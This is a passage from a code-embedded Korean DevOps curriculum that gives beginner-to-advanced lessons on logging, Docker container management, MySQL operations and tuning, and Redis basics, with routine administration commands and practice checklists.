{app="backend"} |= "ERROR"  # 백엔드 에러만
{app="mysql"} | json | duration > 5s  # 느린 쿼리`
                },
                {
                  heading: "5. AI 활용 고급 디버깅",
                  content: "AI에게 복잡한 로그를 분석시키는 방법:",
                  code: `# 프롬프트 예시
"다음은 최근 1시간 동안의 에러 로그입니다.
가장 자주 발생하는 에러 3가지를 찾고,
각각의 근본 원인과 해결 방법을 제시해주세요:

[로그 200줄 붙여넣기]

또한 이 에러들 사이의 연관성이 있다면 설명해주세요."

AI 활용 팁:
- 긴 로그는 요약해서 제공 (중복 제거)
- 환경 정보 함께 제공 (Docker, CapRover, Node.js 버전)
- 이미 시도한 해결 방법 명시
- 타임스탬프 포함 (시간대별 패턴 분석)`
                },
                {
                  heading: "6. 실전: 프로덕션 로깅 전략",
                  list: [
                    "로그 레벨: 프로덕션은 INFO, 개발은 DEBUG",
                    "민감정보 마스킹: 비밀번호, 토큰은 로그에 기록 금지",
                    "로그 로테이션: 오래된 로그 자동 삭제 (7일 보관)",
                    "성능 고려: 로그 과다 기록 시 I/O 병목",
                    "비용 절감: 클라우드 로깅 서비스는 GB당 과금"
                  ],
                  code: `# 로그 로테이션 설정 (Linux logrotate)
/var/log/app/*.log {
  daily
  rotate 7
  compress
  missingok
  notifempty
  create 0644 app app
}

# 민감정보 마스킹 예시
logger.info('User login attempt', {
  username: 'john',
  password: '[REDACTED]',  // 절대 기록하지 말 것!
  ip: req.ip
});`
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "백엔드에 Winston 또는 Pino 로깅 라이브러리 적용",
                    "주요 이벤트 5가지를 JSON 형식으로 로깅 (로그인, 주문, 결제 등)",
                    "jq로 로그를 분석하여 '가장 많이 실패한 API' 찾기",
                    "AI에게 복잡한 에러 로그를 제공하고 근본 원인 분석 요청",
                    "로그 로테이션 설정하여 7일 이상 된 로그 자동 삭제"
                  ]
                }
              ]
            }
          }
        }
      ]
    },
    {
      id: 'tier2',
      name: 'Tier 2: 안정적 운영 기술',
      period: '3~4주',
      color: 'bg-yellow-100 border-yellow-300 text-yellow-800',
      reason: '서비스를 안정적으로 유지하고 문제를 예방하기 위해',
      topics: [
        {
          id: '2-1',
          name: 'Docker 기초와 컨테이너 관리',
          goal: 'Docker의 기본 개념을 이해하고 컨테이너를 관리할 수 있다',
          hours: 8,
          keywords: ['Docker basics', 'container orchestration', 'volume management'],
          tasks: [
            'Docker 명령어 10개 연습',
            '볼륨 마운트 테스트',
            '컨테이너 메모리 제한 설정'
          ],
          content: {
            beginner: {
              title: "초급: Docker가 무엇인지 이해하고 기본 명령어 익히기",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "Docker의 개념을 이해하고, 컨테이너를 조회/시작/중지/삭제할 수 있다."
                },
                {
                  heading: "1. Docker란 무엇인가?",
                  content: "Docker는 '컨테이너'라는 격리된 환경에서 애플리케이션을 실행하는 기술입니다.",
                  list: [
                    "가상머신(VM)보다 가볍고 빠름",
                    "같은 서버에서 여러 앱을 독립적으로 실행",
                    "한 번 만든 이미지로 어디서든 똑같이 실행",
                    "CapRover는 Docker를 쉽게 관리해주는 도구"
                  ]
                },
                {
                  heading: "2. 주요 개념",
                  code: `# 이미지 (Image)
- 앱을 실행하기 위한 '템플릿' 또는 '레시피'
- 예: mysql:8.0, nginx:latest, node:18

# 컨테이너 (Container)
- 이미지로부터 생성된 '실행 중인 인스턴스'
- 하나의 이미지로 여러 컨테이너 생성 가능

# 비유
- 이미지 = 붕어빵 틀
- 컨테이너 = 틀로 만든 실제 붕어빵`
                },
                {
                  heading: "3. 필수 Docker 명령어 10개",
                  steps: [
                    {
                      label: "1. 실행 중인 컨테이너 보기",
                      code: "docker ps\n# CONTAINER ID   IMAGE     COMMAND   STATUS   PORTS   NAMES"
                    },
                    {
                      label: "2. 모든 컨테이너 보기 (중지된 것 포함)",
                      code: "docker ps -a"
                    },
                    {
                      label: "3. 컨테이너 로그 보기",
                      code: "docker logs <container_id>\ndocker logs -f <container_id>  # 실시간으로 계속 보기"
                    },
                    {
                      label: "4. 컨테이너 내부 접속",
                      code: "docker exec -it <container_id> bash\n# MySQL 예시\ndocker exec -it mysql_container mysql -u root -p"
                    },
                    {
                      label: "5. 컨테이너 시작/중지/재시작",
                      code: "docker start <container_id>\ndocker stop <container_id>\ndocker restart <container_id>"
                    },
                    {
                      label: "6. 컨테이너 삭제",
                      code: "docker rm <container_id>\ndocker rm -f <container_id>  # 강제 삭제 (실행 중이어도)"
                    },
                    {
                      label: "7. 이미지 목록 보기",
                      code: "docker images"
                    },
                    {
                      label: "8. 이미지 다운로드",
                      code: "docker pull mysql:8.0\ndocker pull redis:alpine"
                    },
                    {
                      label: "9. 컨테이너 리소스 사용량 확인",
                      code: "docker stats\n# CPU, 메모리, 네트워크 실시간 표시"
                    },
                    {
                      label: "10. 컨테이너 상세 정보",
                      code: "docker inspect <container_id>\n# JSON 형식으로 모든 설정 정보 출력"
                    }
                  ]
                },
                {
                  heading: "4. CapRover에서 Docker 명령어 사용하기",
                  content: "CapRover 서버에 SSH 접속 후 명령어 사용:",
                  code: `# 1. CapRover 호스트에 SSH 접속
ssh root@your-server-ip

# 2. 실행 중인 컨테이너 확인
docker ps

# 3. MySQL 컨테이너 찾기
docker ps | grep mysql

# 4. MySQL 컨테이너 로그 보기
docker logs $(docker ps | grep mysql | awk '{print $1}')

# 5. MySQL 컨테이너 내부 접속
docker exec -it $(docker ps | grep mysql | awk '{print $1}') bash`
                },
                {
                  heading: "✅ 초급 실습",
                  checklist: [
                    "docker ps로 실행 중인 컨테이너 3개 이상 확인",
                    "각 컨테이너의 이름, 이미지, 상태 파악",
                    "docker logs로 MySQL 로그 확인",
                    "docker exec로 MySQL 컨테이너 내부 접속 후 exit로 빠져나오기",
                    "docker stats로 리소스 사용량 확인 (Ctrl+C로 종료)"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 볼륨 마운트와 네트워크 이해하기",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "Docker 볼륨으로 데이터를 영구 보존하고, 컨테이너 간 네트워크 통신을 이해한다."
                },
                {
                  heading: "1. 볼륨이 필요한 이유",
                  content: "컨테이너는 삭제되면 내부 데이터도 사라집니다. 볼륨을 사용하면 데이터를 컨테이너 외부에 저장할 수 있습니다.",
                  list: [
                    "컨테이너 삭제 후 재생성해도 데이터 유지",
                    "여러 컨테이너가 같은 데이터 공유 가능",
                    "백업과 마이그레이션이 쉬움"
                  ]
                },
                {
                  heading: "2. 볼륨 관련 명령어",
                  code: `# 볼륨 목록 보기
docker volume ls

# 볼륨 상세 정보
docker volume inspect <volume_name>

# 볼륨 생성
docker volume create my_data

# 볼륨으로 컨테이너 실행
docker run -v my_data:/var/lib/mysql mysql:8.0

# 호스트 디렉토리 마운트
docker run -v /host/path:/container/path nginx

# 사용하지 않는 볼륨 삭제
docker volume prune`
                },
                {
                  heading: "3. 실습: 볼륨 테스트",
                  steps: [
                    {
                      label: "Step 1",
                      text: "테스트 볼륨 생성",
                      code: "docker volume create test_vol"
                    },
                    {
                      label: "Step 2",
                      text: "볼륨을 마운트한 컨테이너 실행",
                      code: "docker run -it --rm -v test_vol:/data ubuntu bash\n# 컨테이너 내부에서:\necho 'Hello Volume' > /data/test.txt\nexit"
                    },
                    {
                      label: "Step 3",
                      text: "새 컨테이너로 같은 볼륨 확인",
                      code: "docker run -it --rm -v test_vol:/data ubuntu bash\ncat /data/test.txt  # Hello Volume 출력\nexit"
                    },
                    {
                      label: "결과",
                      text: "컨테이너는 삭제되었지만 데이터는 볼륨에 보존됨!"
                    }
                  ]
                },
                {
                  heading: "4. Docker 네트워크",
                  content: "컨테이너끼리 통신하려면 같은 네트워크에 있어야 합니다.",
                  code: `# 네트워크 목록
docker network ls

# 컨테이너가 속한 네트워크 확인
docker inspect <container_id> | grep NetworkMode

# CapRover는 기본적으로 'captain-overlay-network' 사용
# 같은 네트워크의 컨테이너는 컨테이너명으로 통신 가능

# 예시: 백엔드에서 MySQL 접속
DB_HOST=srv-captain--mysql  # CapRover의 명명 규칙
DB_PORT=3306`
                },
                {
                  heading: "5. CapRover에서 볼륨 확인",
                  code: `# CapRover가 생성한 볼륨 보기
docker volume ls | grep captain

# MySQL 데이터 볼륨 찾기
docker volume ls | grep mysql

# 볼륨 백업 (호스트로 복사)
docker run --rm -v <volume_name>:/source -v $(pwd):/backup ubuntu tar czf /backup/backup.tar.gz -C /source .`
                },
                {
                  heading: "✅ 중급 실습",
                  checklist: [
                    "docker volume ls로 현재 볼륨 확인",
                    "MySQL 컨테이너가 사용하는 볼륨 찾기",
                    "테스트 볼륨 생성 후 데이터 보존 확인",
                    "docker network ls로 CapRover 네트워크 확인",
                    "컨테이너 간 통신 테스트 (백엔드 → MySQL)"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 리소스 제한과 컨테이너 최적화",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "컨테이너의 CPU/메모리를 제한하고, 멀티 스테이지 빌드로 이미지를 최적화한다."
                },
                {
                  heading: "1. 리소스 제한의 필요성",
                  content: "한 컨테이너가 과도한 리소스를 사용하면 다른 컨테이너에 영향을 줍니다.",
                  list: [
                    "메모리 제한 없으면 서버 전체 다운 가능",
                    "CPU 제한으로 공평한 자원 분배",
                    "I/O 제한으로 디스크 병목 방지"
                  ]
                },
                {
                  heading: "2. 메모리 제한",
                  code: `# 컨테이너 생성 시 메모리 제한
docker run -m 512m nginx  # 최대 512MB

# 실행 중인 컨테이너 업데이트
docker update --memory 1g <container_id>

# 메모리 초과 시 동작
--oom-kill-disable  # OOM Killer 비활성화 (위험!)
# 기본값: 메모리 초과 시 컨테이너 강제 종료

# CapRover에서 설정
# App Config → Memory Limit: 512MB`
                },
                {
                  heading: "3. CPU 제한",
                  code: `# CPU 코어 수 제한
docker run --cpus=1.5 nginx  # 1.5개 코어 사용

# CPU 상대 비율 (기본값: 1024)
docker run --cpu-shares=512 nginx  # 절반만 사용

# 특정 CPU 코어 지정
docker run --cpuset-cpus=0,1 nginx  # 코어 0, 1만 사용

# 확인
docker stats --no-stream
# CPU %가 설정한 한도를 넘지 않는지 확인`
                },
                {
                  heading: "4. Dockerfile 최적화",
                  content: "멀티 스테이지 빌드로 이미지 크기를 줄입니다:",
                  code: `# Before: 1.2GB
FROM node:18
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "server.js"]

# After: 150MB (멀티 스테이지)
FROM node:18 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:18-alpine
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY . .
CMD ["node", "server.js"]

# 크기 비교
docker images
# node:18         1.2GB
# node:18-alpine  150MB`
                },
                {
                  heading: "5. 컨테이너 헬스체크",
                  code: `# Dockerfile에 헬스체크 추가
HEALTHCHECK --interval=30s --timeout=3s --retries=3 \\
  CMD curl -f http://localhost:3000/health || exit 1

# 실행 중인 컨테이너에 헬스체크 추가
docker run --health-cmd='curl -f http://localhost || exit 1' \\
  --health-interval=30s nginx

# 헬스 상태 확인
docker ps
# STATUS: Up 2 minutes (healthy)`
                },
                {
                  heading: "6. 로깅 드라이버 최적화",
                  content: "로그가 무한정 쌓이지 않도록 제한:",
                  code: `# 로그 크기 제한
docker run --log-opt max-size=10m --log-opt max-file=3 nginx

# JSON 파일 로깅 (기본값)
# /var/lib/docker/containers/<container_id>/<container_id>-json.log

# 로그 확인
docker logs --tail 100 <container_id>

# 로그 파일 직접 삭제 (주의!)
truncate -s 0 /var/lib/docker/containers/*/*-json.log`
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "컨테이너에 메모리 512MB 제한 설정 후 초과 테스트",
                    "CPU 제한 설정 후 docker stats로 확인",
                    "멀티 스테이지 Dockerfile 작성하여 이미지 크기 50% 이상 감소",
                    "헬스체크 설정 후 의도적으로 실패시켜 unhealthy 상태 확인",
                    "로그 크기 제한 설정 후 오래된 로그 자동 삭제 확인"
                  ]
                }
              ]
            }
          }
        },
        {
          id: '2-2',
          name: '데이터베이스 운영 (MySQL)',
          goal: 'MySQL을 안정적으로 운영하고 성능 문제를 파악할 수 있다',
          hours: 10,
          keywords: ['MySQL optimization', 'slow query', 'database maintenance'],
          tasks: [
            '슬로우 쿼리 로그 활성화',
            '현재 연결 수 확인하는 쿼리 실행',
            '테이블별 용량 확인'
          ],
          content: {
            beginner: {
              title: "초급: MySQL 기본 관리와 상태 확인",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "MySQL 서버 상태를 확인하고, 기본적인 관리 작업을 수행할 수 있다."
                },
                {
                  heading: "1. MySQL 운영이 중요한 이유",
                  content: "데이터베이스는 서비스의 핵심입니다. 작은 문제가 전체 서비스 중단으로 이어질 수 있습니다.",
                  list: [
                    "느린 쿼리 → 사용자 경험 저하 (로딩 5초 이상)",
                    "연결 수 초과 → 신규 사용자 접속 불가",
                    "디스크 용량 부족 → 데이터 입력 실패",
                    "백업 없음 → 데이터 손실 시 복구 불가"
                  ]
                },
                {
                  heading: "2. MySQL 컨테이너 접속하기",
                  steps: [
                    {
                      label: "방법 1: CapRover 대시보드",
                      code: "Apps → MySQL 앱 → 우측 ... 메뉴 → Web Terminal"
                    },
                    {
                      label: "방법 2: Docker 명령어",
                      code: "# MySQL 컨테이너 찾기\ndocker ps | grep mysql\n\n# 컨테이너 내부 접속\ndocker exec -it <container_id> bash\n\n# MySQL 클라이언트 실행\nmysql -u root -p$MYSQL_ROOT_PASSWORD"
                    }
                  ]
                },
                {
                  heading: "3. 서버 상태 확인 필수 명령어",
                  code: `-- 1. 현재 연결 수 확인
SHOW STATUS LIKE 'Threads_connected';
-- 결과: Threads_connected | 15
-- 의미: 현재 15개 연결 활성화

-- 2. 최대 연결 수 확인
SHOW VARIABLES LIKE 'max_connections';
-- 기본값: 151
-- 15/151 = 10% 사용 중 (안전)

-- 3. 실행 중인 쿼리 확인
SHOW PROCESSLIST;
-- Id, User, Host, db, Command, Time, State, Info 표시
-- Time이 큰 쿼리 = 느린 쿼리

-- 4. 데이터베이스 목록
SHOW DATABASES;

-- 5. 현재 사용자 확인
SELECT USER(), DATABASE();`
                },
                {
                  heading: "4. 테이블 용량 확인",
                  code: `-- 데이터베이스별 용량
SELECT
  table_schema AS 'Database',
  ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.tables
GROUP BY table_schema
ORDER BY SUM(data_length + index_length) DESC;

-- 특정 데이터베이스의 테이블별 용량
USE cms_database;
SELECT
  table_name AS 'Table',
  ROUND((data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)',
  table_rows AS 'Rows'
FROM information_schema.tables
WHERE table_schema = 'cms_database'
ORDER BY (data_length + index_length) DESC;

-- 결과 예시:
-- posts       15.23 MB    50000 rows
-- users        2.45 MB    10000 rows
-- sessions     1.12 MB    25000 rows`
                },
                {
                  heading: "5. 기본 유지보수 작업",
                  steps: [
                    {
                      label: "테이블 최적화",
                      text: "데이터 삭제 후 공간을 회수합니다",
                      code: "OPTIMIZE TABLE posts;\n-- 결과: Table optimized"
                    },
                    {
                      label: "테이블 검사",
                      text: "데이터 손상 여부 확인",
                      code: "CHECK TABLE posts;\n-- 결과: OK 또는 repair 필요"
                    },
                    {
                      label: "테이블 복구",
                      text: "손상된 테이블 수리",
                      code: "REPAIR TABLE posts;"
                    }
                  ]
                },
                {
                  heading: "6. 일반적인 문제와 해결",
                  list: [
                    "연결 실패 → 방화벽, 비밀번호 확인",
                    "Too many connections → max_connections 증가 또는 유휴 연결 종료",
                    "Disk full → 오래된 로그 삭제, 불필요한 데이터 정리",
                    "Table is full → 테이블 용량 제한 확인 (InnoDB는 보통 무제한)"
                  ]
                },
                {
                  heading: "✅ 초급 실습",
                  checklist: [
                    "MySQL 컨테이너에 접속하여 root로 로그인",
                    "현재 연결 수와 최대 연결 수 확인",
                    "SHOW PROCESSLIST로 실행 중인 쿼리 확인",
                    "데이터베이스별 용량 확인 쿼리 실행",
                    "가장 큰 테이블 3개 찾기"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 슬로우 쿼리 분석과 성능 튜닝",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "느린 쿼리를 찾아내고, 인덱스를 활용하여 성능을 개선할 수 있다."
                },
                {
                  heading: "1. 슬로우 쿼리 로그란?",
                  content: "지정한 시간(예: 2초) 이상 걸리는 쿼리를 자동으로 기록하는 기능입니다.",
                  list: [
                    "병목 쿼리를 식별할 수 있음",
                    "인덱스가 필요한 부분 파악",
                    "불필요한 JOIN이나 서브쿼리 발견",
                    "프로덕션에서는 항상 활성화 권장"
                  ]
                },
                {
                  heading: "2. 슬로우 쿼리 로그 활성화",
                  code: `-- 현재 설정 확인
SHOW VARIABLES LIKE 'slow_query%';
SHOW VARIABLES LIKE 'long_query_time';

-- 활성화 (재시작 시 유지하려면 my.cnf 수정 필요)
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 2;  -- 2초 이상 쿼리 기록
SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';

-- my.cnf 영구 설정
[mysqld]
slow_query_log = 1
long_query_time = 2
slow_query_log_file = /var/log/mysql/slow.log
log_queries_not_using_indexes = 1  -- 인덱스 미사용 쿼리도 기록`
                },
                {
                  heading: "3. 슬로우 쿼리 로그 분석",
                  code: `# 로그 파일 확인
tail -f /var/log/mysql/slow.log

# 로그 예시
# Time: 2025-01-04T15:30:00.123456Z
# User@Host: cms_user[cms_user] @ 172.17.0.5
# Query_time: 5.234567  Lock_time: 0.000123  Rows_sent: 1000  Rows_examined: 500000
SELECT * FROM posts WHERE created_at > '2024-01-01';

-- 분석 포인트:
-- Query_time: 5.2초 (너무 느림!)
-- Rows_examined: 500000 (50만 행 검사)
-- Rows_sent: 1000 (1000행만 반환)
-- → 인덱스가 없어서 전체 테이블 스캔!`
                },
                {
                  heading: "4. EXPLAIN으로 쿼리 분석",
                  code: `-- 쿼리 실행 계획 확인
EXPLAIN SELECT * FROM posts WHERE created_at > '2024-01-01';

-- 결과 예시:
-- id | select_type | table | type | possible_keys | key  | rows   | Extra
-- 1  | SIMPLE      | posts | ALL  | NULL          | NULL | 500000 | Using where

-- type = ALL → 전체 테이블 스캔 (최악!)
-- rows = 500000 → 50만 행 검사

-- 인덱스 추가 후:
CREATE INDEX idx_created_at ON posts(created_at);

EXPLAIN SELECT * FROM posts WHERE created_at > '2024-01-01';
-- type = range → 범위 스캔 (좋음)
-- rows = 1000 → 1000행만 검사 (500배 개선!)`
                },
                {
                  heading: "5. 인덱스 전략",
                  content: "효과적인 인덱스 설계:",
                  list: [
                    "WHERE 절에 자주 사용되는 컬럼",
                    "JOIN 조건에 사용되는 외래키",
                    "ORDER BY에 사용되는 컬럼",
                    "복합 인덱스는 카디널리티 높은 컬럼 우선"
                  ],
                  code: `-- 단일 인덱스
CREATE INDEX idx_username ON users(username);

-- 복합 인덱스 (순서 중요!)
CREATE INDEX idx_user_created ON posts(user_id, created_at);
-- user_id로 필터링 후 created_at으로 정렬하는 쿼리에 최적

-- 유니크 인덱스
CREATE UNIQUE INDEX idx_email ON users(email);

-- 인덱스 목록 확인
SHOW INDEX FROM posts;

-- 인덱스 삭제
DROP INDEX idx_created_at ON posts;`
                },
                {
                  heading: "6. 쿼리 최적화 팁",
                  list: [
                    "SELECT * 대신 필요한 컬럼만 조회",
                    "LIMIT 사용하여 결과 제한",
                    "서브쿼리 대신 JOIN 사용 (대부분의 경우)",
                    "COUNT(*)보다 COUNT(id) 또는 캐시 활용",
                    "LIKE '%keyword%' 대신 전문 검색(Full-Text Search)"
                  ],
                  code: `-- 나쁜 쿼리
SELECT * FROM posts WHERE title LIKE '%검색어%';
-- 인덱스 사용 불가, 전체 스캔

-- 개선 1: 전문 검색 인덱스
ALTER TABLE posts ADD FULLTEXT(title);
SELECT * FROM posts WHERE MATCH(title) AGAINST('검색어');

-- 개선 2: 접두어 검색
SELECT * FROM posts WHERE title LIKE '검색어%';
-- 인덱스 사용 가능`
                },
                {
                  heading: "✅ 중급 실습",
                  checklist: [
                    "슬로우 쿼리 로그 활성화 (2초 기준)",
                    "의도적으로 느린 쿼리 실행 후 로그 확인",
                    "EXPLAIN으로 쿼리 분석하여 type=ALL 찾기",
                    "적절한 인덱스 추가 후 성능 비교",
                    "인덱스 추가 전후 EXPLAIN 결과 비교하여 rows 차이 확인"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 복제, 파티셔닝, 고급 튜닝",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "MySQL 복제(Replication)를 설정하고, 대용량 테이블을 파티셔닝하여 성능을 극대화한다."
                },
                {
                  heading: "1. MySQL 복제 (Replication)",
                  content: "마스터-슬레이브 구조로 데이터를 실시간 복사합니다.",
                  list: [
                    "읽기 부하 분산 (슬레이브에서 SELECT)",
                    "백업 소스 (슬레이브에서 백업하여 마스터 부하 감소)",
                    "고가용성 (마스터 장애 시 슬레이브를 승격)",
                    "지리적 분산 (다른 지역에 슬레이브 배치)"
                  ]
                },
                {
                  heading: "2. 복제 설정 (마스터)",
                  code: `# 마스터 my.cnf 설정
[mysqld]
server-id = 1
log_bin = /var/log/mysql/mysql-bin.log
binlog_do_db = cms_database  # 복제할 DB

# MySQL 재시작 후 복제 사용자 생성
CREATE USER 'repl_user'@'%' IDENTIFIED BY 'strong_password';
GRANT REPLICATION SLAVE ON *.* TO 'repl_user'@'%';
FLUSH PRIVILEGES;

# 마스터 상태 확인
SHOW MASTER STATUS;
-- File: mysql-bin.000001, Position: 154`
                },
                {
                  heading: "3. 복제 설정 (슬레이브)",
                  code: `# 슬레이브 my.cnf 설정
[mysqld]
server-id = 2
relay_log = /var/log/mysql/relay.log
read_only = 1  # 실수로 쓰기 방지

# 마스터 연결 설정
CHANGE MASTER TO
  MASTER_HOST='master_ip',
  MASTER_USER='repl_user',
  MASTER_PASSWORD='strong_password',
  MASTER_LOG_FILE='mysql-bin.000001',
  MASTER_LOG_POS=154;

# 복제 시작
START SLAVE;

# 복제 상태 확인
SHOW SLAVE STATUS\\G
-- Slave_IO_Running: Yes
-- Slave_SQL_Running: Yes
-- Seconds_Behind_Master: 0`
                },
                {
                  heading: "4. 테이블 파티셔닝",
                  content: "대용량 테이블을 논리적으로 분할하여 성능을 향상시킵니다.",
                  code: `-- 날짜 기준 파티셔닝 (로그 테이블에 유용)
CREATE TABLE access_logs (
  id BIGINT AUTO_INCREMENT,
  user_id INT,
  accessed_at DATETIME,
  ip VARCHAR(45),
  PRIMARY KEY (id, accessed_at)
)
PARTITION BY RANGE (YEAR(accessed_at)) (
  PARTITION p2023 VALUES LESS THAN (2024),
  PARTITION p2024 VALUES LESS THAN (2025),
  PARTITION p2025 VALUES LESS THAN (2026),
  PARTITION p_future VALUES LESS THAN MAXVALUE
);

-- 파티션별 데이터 확인
SELECT
  PARTITION_NAME,
  TABLE_ROWS
FROM INFORMATION_SCHEMA.PARTITIONS
WHERE TABLE_NAME = 'access_logs';

-- 오래된 파티션 삭제 (빠른 삭제)
ALTER TABLE access_logs DROP PARTITION p2023;`
                },
                {
                  heading: "5. 고급 성능 튜닝",
                  code: `-- InnoDB 버퍼 풀 크기 (전체 메모리의 70-80%)
SET GLOBAL innodb_buffer_pool_size = 4G;

-- 쿼리 캐시 (MySQL 8.0에서는 제거됨, Redis로 대체 권장)
SET GLOBAL query_cache_size = 128M;

-- 연결 풀 크기
SET GLOBAL max_connections = 500;
SET GLOBAL wait_timeout = 300;  -- 유휴 연결 5분 후 종료

-- 임시 테이블 크기
SET GLOBAL tmp_table_size = 128M;
SET GLOBAL max_heap_table_size = 128M;

-- 정렬 버퍼 (복잡한 ORDER BY 성능 향상)
SET GLOBAL sort_buffer_size = 4M;`
                },
                {
                  heading: "6. 프로파일링과 진단",
                  code: `-- 프로파일링 활성화 (쿼리 세부 분석)
SET profiling = 1;

SELECT * FROM posts WHERE user_id = 123;

SHOW PROFILES;
-- Query_ID | Duration | Query

SHOW PROFILE FOR QUERY 1;
-- Status                | Duration
-- Opening tables        | 0.000050
-- Executing             | 0.002345
-- Sending data          | 0.001234
-- End                   | 0.000010

-- Performance Schema 활용
SELECT * FROM performance_schema.events_statements_summary_by_digest
ORDER BY SUM_TIMER_WAIT DESC
LIMIT 10;
-- 가장 느린 쿼리 10개`
                },
                {
                  heading: "7. 실전 마이그레이션 전략",
                  content: "무중단 마이그레이션 방법:",
                  steps: [
                    {
                      label: "1단계: 새 슬레이브 추가",
                      text: "기존 마스터에 새 슬레이브 연결"
                    },
                    {
                      label: "2단계: 데이터 동기화",
                      text: "슬레이브가 마스터를 완전히 따라잡을 때까지 대기"
                    },
                    {
                      label: "3단계: 읽기 트래픽 전환",
                      text: "애플리케이션의 SELECT 쿼리를 슬레이브로 전환"
                    },
                    {
                      label: "4단계: 마스터 승격",
                      text: "점검 시간에 슬레이브를 새 마스터로 승격"
                    }
                  ]
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "마스터-슬레이브 복제 구성 (Docker Compose로 로컬 테스트)",
                    "슬레이브에서 읽기 전용 확인 (쓰기 시도 시 에러)",
                    "100만 행 이상 테이블에 파티셔닝 적용",
                    "파티션 프루닝(Partition Pruning) 효과 EXPLAIN으로 확인",
                    "Performance Schema로 가장 느린 쿼리 TOP 10 분석"
                  ]
                }
              ]
            }
          }
        },
        {
          id: '2-3',
          name: 'Redis 운영과 캐싱 전략',
          goal: 'Redis를 효과적으로 활용하고 메모리를 관리할 수 있다',
          hours: 6,
          keywords: ['Redis management', 'session storage', 'cache strategy'],
          tasks: [
            'Redis CLI로 데이터 조회',
            '메모리 사용량 확인',
            '세션 데이터 구조 파악'
          ],
          content: {
            beginner: {
              title: "초급: Redis 기본 개념과 CLI 사용법",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "Redis가 무엇인지 이해하고, Redis CLI로 데이터를 조회하고 관리할 수 있다."
                },
                {
                  heading: "1. Redis란 무엇인가?",
                  content: "Redis는 메모리 기반의 키-값(Key-Value) 저장소입니다. 매우 빠른 속도로 데이터를 읽고 쓸 수 있습니다.",
                  list: [
                    "캐시: 자주 사용하는 데이터를 빠르게 조회 (DB 부하 감소)",
                    "세션 저장소: 로그인 정보, 장바구니 등",
                    "실시간 랭킹: 게임 순위, 인기 게시물",
                    "메시지 큐: 작업 대기열, 실시간 알림"
                  ]
                },
                {
                  heading: "2. Redis vs MySQL",
                  code: `# MySQL (디스크 기반)
- 영구 저장 (서버 재시작해도 데이터 유지)
- 복잡한 쿼리 가능 (JOIN, GROUP BY 등)
- 속도: 밀리초 단위 (1~100ms)

# Redis (메모리 기반)
- 휘발성 (기본적으로 재시작 시 삭제, 옵션으로 디스크 저장 가능)
- 단순한 키-값 조회
- 속도: 마이크로초 단위 (0.1ms 미만)

# 활용 예시
MySQL: 사용자 정보, 주문 내역 (영구 보관 필요)
Redis: 로그인 세션, 조회수 캐시 (일시적, 빠른 속도 필요)`
                },
                {
                  heading: "3. Redis CLI 접속하기",
                  steps: [
                    {
                      label: "방법 1: CapRover 대시보드",
                      code: "Apps → Redis 앱 → ... 메뉴 → Web Terminal\nredis-cli"
                    },
                    {
                      label: "방법 2: Docker 명령어",
                      code: "# Redis 컨테이너 찾기\ndocker ps | grep redis\n\n# Redis CLI 실행\ndocker exec -it <container_id> redis-cli\n\n# 연결 확인\nPING\n# 응답: PONG"
                    }
                  ]
                },
                {
                  heading: "4. 기본 명령어",
                  code: `# 1. 문자열 저장/조회
SET username "john"
GET username
# 결과: "john"

# 2. 유효기간 설정 (TTL: Time To Live)
SETEX session:user123 3600 "logged_in"
# 3600초(1시간) 후 자동 삭제

# 3. 남은 시간 확인
TTL session:user123
# 결과: 3599 (초)

# 4. 키 존재 여부
EXISTS username
# 결과: 1 (존재), 0 (없음)

# 5. 키 삭제
DEL username

# 6. 모든 키 보기 (주의: 프로덕션에서는 위험!)
KEYS *

# 7. 특정 패턴의 키 검색
KEYS session:*

# 8. 데이터베이스 선택 (기본 0~15)
SELECT 1
# DB 1번으로 전환`
                },
                {
                  heading: "5. 세션 데이터 구조 파악",
                  content: "실제 서비스에서 Redis에 저장된 세션 데이터 확인하기:",
                  code: `# 세션 키 패턴 찾기
KEYS sess:*
# 또는
KEYS PHPREDIS_SESSION:*

# 세션 데이터 조회
GET "sess:abc123def456"

# 결과 예시 (직렬화된 데이터)
# user_id|i:123;username|s:4:"john";cart|a:2:{i:0;s:5:"item1";i:1;s:5:"item2";}

# 세션 유효기간 확인
TTL "sess:abc123def456"
# 결과: 1800 (30분)`
                },
                {
                  heading: "6. 메모리 사용량 확인",
                  code: `# 서버 정보
INFO memory

# 주요 지표:
# used_memory_human: 15.23M (현재 사용 중인 메모리)
# maxmemory: 256M (최대 메모리 제한)
# used_memory_peak_human: 20.45M (최대 사용량)

# 모든 키 개수
DBSIZE
# 결과: 1523

# 특정 키의 메모리 사용량
MEMORY USAGE username
# 결과: 56 (bytes)`
                },
                {
                  heading: "✅ 초급 실습",
                  checklist: [
                    "Redis CLI 접속 후 PING 명령어로 연결 확인",
                    "SET/GET으로 문자열 저장/조회 테스트",
                    "SETEX로 10초 후 삭제되는 키 생성 후 TTL로 확인",
                    "KEYS 명령어로 현재 저장된 모든 키 확인",
                    "INFO memory로 메모리 사용량 확인"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 캐싱 전략과 데이터 타입 활용",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "다양한 Redis 데이터 타입을 활용하고, 효과적인 캐싱 전략을 수립할 수 있다."
                },
                {
                  heading: "1. Redis 데이터 타입",
